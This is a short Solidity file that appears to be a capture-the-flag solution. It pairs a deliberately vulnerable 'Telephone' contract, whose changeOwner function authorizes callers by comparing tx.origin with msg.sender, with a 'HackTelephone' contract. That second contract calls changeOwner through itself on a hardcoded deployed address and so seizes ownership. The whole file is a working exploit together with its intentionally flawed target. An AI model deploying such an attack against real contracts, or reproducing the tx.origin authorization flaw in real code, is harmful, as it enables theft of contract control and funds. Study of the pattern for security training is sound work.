// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract HackTelephone {
    Telephone caller = Telephone(0xfA7aC29c79FE83b565B1Ce09f9AE9A2413b774B9);

    function takeOwnership(address _address) public {
        caller.changeOwner(_address);
    }
}
